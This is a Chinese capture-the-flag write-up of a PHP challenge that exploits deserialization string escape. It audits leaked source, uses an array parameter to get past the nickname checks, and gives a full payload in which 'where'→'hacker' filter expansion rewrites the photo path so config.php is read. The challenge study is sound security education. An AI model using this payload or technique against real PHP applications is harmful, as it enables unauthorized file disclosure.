##  前言

考点是反序列化字符串逃逸

##  wp

首先这个题，一进来就是一个登录平台，就属于一种基本的web网站的搭建，先登录再去后台，一般来说，可以sql注入之类的，但是我们习惯先看F12的源码，然后用御剑和dirsearch工具去扫描后台或者文件的泄露。

发现存在备份文件泄露，www.zip，得到源码



开始代码审计

config.php中发现了flag变量，看来题目目的是让我们读取config.php了。

我们来看下每个页面：
 index.php

```php
<?php
	require_once('class.php');
	if($_SESSION['username']) {
		header('Location: profile.php');
		exit;
	}
	if($_POST['username'] && $_POST['password']) {
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strlen($username) < 3 or strlen($username) > 16) 
			die('Invalid user name');

		if(strlen($password) < 3 or strlen($password) > 16) 
			die('Invalid password');

		if($user->login($username, $password)) {
			$_SESSION['username'] = $username;
			header('Location: profile.php');
			exit;	
		}
		else {
			die('Invalid user name or password');
		}
	}
	else {
    }
?>
```

register.php：

```php
<?php
	require_once('class.php');
	if($_POST['username'] && $_POST['password']) {
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strlen($username) < 3 or strlen($username) > 16) 
			die('Invalid user name');

		if(strlen($password) < 3 or strlen($password) > 16) 
			die('Invalid password');
		if(!$user->is_exists($username)) {
			$user->register($username, $password);
			echo 'Register OK!<a href="index.php">Please Login</a>';		
		}
		else {
			die('User name Already Exists');
		}
	}
	else {
?>
```

这两个个是登录页面和注册页面，要求我们输入的用户名和密码的长度都在3-16内。

然后看class.php,现了过滤的函数，一些特殊的符号会用下划线代替，一些特殊的关键字用hacker进行代替。

```php
public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}

```

class.php中就是对传入的数据进行过滤和进行数据库操作

然后我们看update.php

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
	else {
?>
```

就是对上传的数据和文件进行处理和过滤。

在这个页面我们要输入phone，要求是11为的数字。email格式要求类似于1@qq.com。nickname要求为数字字母下划线并且长度要小于等于10。注意：前两个都是不满足正则则退出，但是nickname是满足才退出，我们可以用数组绕过正则和strlen函数，比如 nickname=a!会die出去但是nickname[]=a!则会成功执行下面的语句。

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname'); 

```

有个关键点

```php
$user->update_profile($username, serialize($profile));
```

这儿序列化，后面有反序列化，我们可以利用这一点

看个有趣的实验

```
<?php 
$p='abc';
$f = serialize(array($p));
var_dump($f);
 ?>
string(20) "a:1:{i:0;s:3:"abc";}"
```

```php
$s = 'a:1:{i:0;s:3:"axx";}bc";}';
var_dump(unserialize($s));

输出：
array(1) {
  [0] =>
  string(3) "axx"
}
```

这就实现了反序列化字符串的逃逸

profile.php

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
?>
<!DOCTYPE html>
<html>
<head>
   <title>Profile</title>
   <link href="static/bootstrap.min.css" rel="stylesheet">
   <script src="static/jquery.min.js"></script>
   <script src="static/bootstrap.min.js"></script>
</head>
<body>
	<div class="container" style="margin-top:100px">  
		<img src="data:image/gif;base64,<?php echo $photo; ?>" class="img-memeda " style="width:180px;margin:0px auto;">
		<h3>Hi <?php echo $nickname;?></h3>
		<label>Phone: <?php echo $phone;?></label>
		<label>Email: <?php echo $email;?></label>
	</div>
</body>
</html>
<?php
	}
?>
```

这个php会把$nickname，$phone,$email输出出来

所以我们只需要把photo的文件名换成config.php，就可以把config.php的内容按照base64_encode的形式输出出来。



我们输入正常的电话邮箱绰号照片后，正常的序列化字符串如下：

```php
a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"1@qq.com";s:8:"nickname";s:3:"abc";s:5:"photo";s:39:"upload/47bce5c74f589f4867dbd57e9ca9f808";}
```

需要的字符串

```php
a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"1@qq.com";s:8:"nickname";s:3:"abc";s:5:"photo";s:10:"config.php";}
```

我们唯一能利用的地方就是 nickname我们可以输入 xxx";s:5:“photo”;s:10:“config.php”;}
这样就可以把后面的忽略掉但是这个xxx的长度我们要保证符合真实的长度。这里正好可以利用过滤里的方法，因为nickname是先序列化然后再过滤的，但是生成的序列化字符串的长度还是原来的。比如我们nickname输入的是where长度是5 经过过滤后变成hacker长度变成了6.这时我们就可以有一个长度的字符可以利用，每输入一个where就有一个
我们根据我们的目的字符串内容，需要填充的是";}s:5:"photo";s:10:"config.php";}长度为34,如果我们输入34个where则足够填充这些字符达到逃逸的目的
所以最终的payload为

```php
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

因为其他的几个过滤函数都是6个字符，所以只能用where。



因此我们的操作是：

1.先访问/register.php,注册

2.登录注册的

3.上传东西（符合条件），然后抓包，改参数，放包

4.访问prefile.php,找图片的源码，得到base64的编码，解码就是flag

